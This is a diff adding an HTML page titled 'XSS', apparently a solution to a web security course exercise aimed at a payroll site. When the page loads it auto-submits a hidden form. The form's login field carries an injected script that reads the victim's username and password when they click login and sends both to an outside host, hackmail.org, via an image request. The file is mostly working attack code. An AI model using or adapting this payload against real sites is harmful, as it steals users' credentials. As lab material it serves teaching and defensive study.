@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSS</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action="http://payroll.gatech.edu" onsubmit="" method="POST">
+    	<!-- Your exploits here. You may also want to change some form attributes -->
+	<input type="hidden" name="login" value="&quot;&gt;&lt;script&gt;window.onload = function() { document.getElementsByName(&quot;action&quot;)[0].addEventListener(&quot;click&quot;, function() { var account = document.getElementsByName(&quot;login&quot;)[0].value; var pw = document.getElementsByName(&quot;pw&quot;)[0].value; javascript:void((new Image()).src='http://hackmail.org/sendmail.php?'+'&amp;username=JSVUYXJnZXQyLVRoaXNPbmVDYW5CZURpZmZpY3VsdC1FYXN0ZXJFZ2dTcHJpbmcyMDIyJSU' + `&amp;payload=${account}+${pw}`+'&amp;random='+Math.random()); }) };&lt;/script&gt;&lt;br class=&quot;" />
+    </form>
+  </body>
+</html>
